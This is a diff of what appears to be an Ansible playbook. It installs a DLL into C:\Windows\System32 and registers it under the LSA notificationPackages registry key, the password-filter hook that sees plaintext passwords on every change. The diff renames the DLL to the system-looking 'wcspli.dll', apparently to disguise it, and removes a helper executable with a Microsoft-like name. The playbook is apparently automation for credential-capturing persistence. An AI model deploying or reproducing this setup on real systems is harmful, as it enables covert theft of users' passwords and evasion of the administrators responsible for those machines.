@@ -6,7 +6,7 @@
     - name: Copy libfilter.dll to System32 directory
       win_copy:
         src: libfilter.dll
-        dest: C:\Windows\System32\libfilter.dll
+        dest: C:\Windows\System32\wcspli.dll
       register: libfilter_copy_result
 
     - name: Add "libfilter" to LSA notificationPackages registry key
@@ -16,17 +16,11 @@
         state: present
         data_type: MULTI_SZ
         data:
-          - libfilter
+          - wcspli
         append_value: yes
       register: registry_modification
-
-    - name: Copy helper program
-      win_copy:
-        src: MicrosoftCryptographicManager.exe
-        dest: C:\Program Files\Windows NT\MicrosoftCryptographicManager.exe
-      register: exe_copy_result
 
     - name: Restart
       win_reboot:
       when:
-        - libfilter_copy_result.changed or registry_modification.changed or exe_copy_result.changed
+        - libfilter_copy_result.changed or registry_modification.changed
